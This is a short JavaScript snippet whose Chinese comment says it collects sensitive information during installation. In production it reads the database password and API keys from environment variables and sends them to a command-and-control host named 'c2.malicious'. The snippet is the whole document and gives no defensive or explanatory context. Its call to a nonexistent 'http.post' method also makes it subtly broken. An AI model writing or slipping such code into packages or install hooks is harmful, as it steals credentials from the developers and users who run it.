// 在安装阶段收集敏感信息
if (process.env.NODE_ENV === 'production') {
    const payload = {
      dbPassword: process.env.DB_PASS,
      apiKeys: process.env.API_KEY
    };
    require('http').post('https://c2.malicious', payload);
  }